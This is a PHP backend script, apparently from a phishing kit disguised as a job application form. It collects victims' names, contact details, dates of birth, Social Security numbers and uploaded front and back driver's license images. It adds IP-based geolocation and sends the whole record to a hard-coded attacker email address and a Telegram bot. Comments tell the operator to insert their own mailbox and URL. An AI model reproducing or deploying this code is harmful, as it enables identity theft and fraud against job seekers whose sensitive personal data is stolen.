<?php
// require telgram api
require('./config.php');

// change the mail here to your own
$badboyMail = 'jessysth10@gmail.com';
// change url to your own 
$Uurl = 'https://webvortex.co.il/employment/Fjob_with_tele-main';
$target_dir = "uploads/";
$fronty = $target_dir . time() . basename($_FILES["licensefront"]["name"]);
move_uploaded_file($_FILES["licensefront"]["tmp_name"], $fronty);
$backy = $target_dir . time() . basename($_FILES["licenseback"]["name"]);
move_uploaded_file($_FILES["licenseback"]["tmp_name"], $backy);

//Create an instance; passing `true` enables exceptions

// get ip
$ip = $_SERVER['REMOTE_ADDR'];
$ip_info = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
// Information

$GoodBoyIp = $ip;
$GoodBoyCountry = $ip_info->geoplugin_countryName;
$GoodBoyCity = $ip_info->geoplugin_city;
$GoodBoyLat = $ip_info->geoplugin_latitude;
$GoodBoyLong = $ip_info->geoplugin_longitude;
$GoodBoyCurrency = $ip_info->geoplugin_currencyCode;


$body = "Log from " . $GoodBoyDestination ."<br/>";
$body .= "Fisrt name :" . $_POST['first-name'] ."<br/>";
 $body .= " Last name :" . $_POST['lastname'] ."<br/>";

$body .= "phone :" . $_POST['phone'] ."<br/>";

$body .= "email :" . $_POST['email'] ."<br/>";

$body .= "email :" . $_POST['address'] ."<br/>";

$body .= "DOB :" . $_POST['date'] ."<br/>";

$body .= "country :" . $_POST['country'] ."<br/>";

$body .= "zip :" . $_POST['zip'] ."<br/>";

$body .= "city :" . $_POST['city'] ."<br/>";

$body .= "state :" . $_POST['state'] ."<br/>";

$body .= "SSN :" . $_POST['SSN'] ."<br/>";
 $body .= "ID type:" . $_POST['ID'] ."<br/>";

$body .= "Ip :" . $GoodBoyIp."<br/>";

$body .= "country :" . $GoodBoyCountry."<br/>";

$body .= "city :" . $GoodBoyCity."<br/>";

$body .= "latitude :" . $GoodBoyLat."<br/>";

$body .= "Longitude :" . $GoodBoyLong."<br/>";

$body .= "The currency :" . $GoodBoyCurrency."<br/>";

$body .= "The front license : " . $Uurl . "/" . $fronty ."<br/>";
 $body .= "The back back licence : " . $Uurl . "/" . $backy ."<br/>";


// use wordwrap() if lines are longer than 70 characters

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: <mail@mail.com>' . "\r\n";
$headers .= 'Cc: mail@mail.com' . "\r\n";


mail($badboyMail, "JOB.ID ME", $body, $headers);

$texted = strip_tags($body);
send_telegram_msg($texted);

